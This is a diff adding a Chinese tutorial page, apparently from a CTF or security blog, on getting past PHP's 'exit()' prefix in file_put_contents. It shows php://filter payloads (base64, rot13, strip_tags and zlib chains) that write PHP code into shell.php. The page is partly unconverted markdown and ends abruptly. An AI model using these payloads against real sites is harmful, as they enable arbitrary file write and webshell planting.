@@ -1,0 +1,85 @@
+<h1 id="php死亡exit-绕过"><a href="#php死亡exit-绕过" class="headerlink" title="php死亡exit()绕过"></a>php死亡exit()绕过</h1><p>需要绕过exit()的地方一般都是<code>file_put_contents</code></p>
+<p>大致有如下三种</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);</span><br><span class="line">file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);</span><br><span class="line">file_put_contents($filename,$content . &quot;\nxxxxxx&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><strong>tips：伪协议处理时会对过滤器urldecode一次；面对不可用的规则是报个Warning，然后跳过继续执行</strong></p>
+<h3 id="第一种情况"><a href="#第一种情况" class="headerlink" title="第一种情况"></a>第一种情况</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);</span><br></pre></td></tr></table></figure>
+
+<p>base64编码绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=php://filter/convert.base64-decode/resource=shell.php</span><br><span class="line">content=aPD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure>
+
+<p>利用php:&#x2F;&#x2F;filter 伪协议  先将  &lt;?php exit();”.$content   也就是  &lt;?php exit();aPD9waHAgcGhwaW5mbygpOz8+  内容解码后再写入  shell.php  文件中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;`base64编码后为`PD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure>
+
+<p>前面加个a的原因是base64解码以4个字节为1组转换为3个字节</p>
+<p>前面的&lt;?php exit(); 符合base64编码的只有phpexit这七个字节，因此添加一个字节来满足编码</p>
+<?  空格  ;  为什么不算呢？
+
+**Base64 解码时，符号的处理方式**
+
+在 PHP 中，`base64_decode()` 只处理 **Base64 允许的字符**，即：
+
+- `A-Z`
+- `a-z`
+- `0-9`
+- `+` 和 `/`
+- `=`（填充符）
+
+**任何不在这个范围内的符号**（例如空格、`<`, `?`, `;`）：
+
+- 如果出现在 Base64 数据中，可能会被忽略、导致解码失败，或者返回 `false`（如果 `strict` 参数为 `true`）。
+- 但 `base64_decode()` **不会把它们当作特殊字符处理**，它只是单纯地按照 Base64 规则解析。
+
+所以base解码并不会识别<?  空格  ;  也就是只有七个字节需要加一个字节来凑一下  使其满足编码
+
+解码 <?php exit();aPD9waHAgcGhwaW5mbygpOz8+ 的结果
+
+![image-20250402073407130](C:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250402073407130.png)
+
+rot13编码绕过
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=php://filter/convert.string.rot13/resource=shell.php</span><br><span class="line">content=&lt;?cuc cucvasb();?&gt;</span><br></pre></td></tr></table></figure>
+
+原理同上  因为rot13编码不用考虑前面的字符长度，更为方便
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exit();&lt;?cuc cucvasb();?&gt;</span><br></pre></td></tr></table></figure>
+
+解码结果    
+
+![image-20250402073842578](C:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250402073842578.png)
+
+但有局限性，如果开启了短标签的话，前面内容就会解析，导致代码错误
+
+过滤器嵌套绕过
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=php://filter/string.strip_tags|convert.base64-decode/resource=shell.php</span><br><span class="line">content=?&gt;PD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure>
+
+string.strip_tags 可以过滤掉html标签和php标签里的内容  然后再进行base64解码
+
+![image-20250402074843701](C:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250402074843701.png)
+
+第一行为执行strip_tags的结果
+
+第二行对strip_tags执行的结果进行base64解码
+
+需要注意的是`string.strip_tags`在php7.3.0以上的环境下会发生段错误，从而导致无法写入，php5则不受影响
+
+另外一种payload
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=php://filter/zlib.deflate|string.tolower|zlib.inflate|/resource=shell.php</span><br><span class="line">content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0dphpinfo();?&gt;/resource=shell.php</span><br></pre></td></tr></table></figure>
+
+先进行压缩，再转小写，再解压，最后可以非常巧合的发现目的代码并没有发生改变
+
+### 第二种情况
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);</span><br></pre></td></tr></table></figure>
+
+#### rot13编码绕过
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=php://filter/string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=shell.php</span><br></pre></td></tr></table></figure>
+
+结果如下
+
+
+
+如果`rot`被过滤了的话可以考虑二次编码
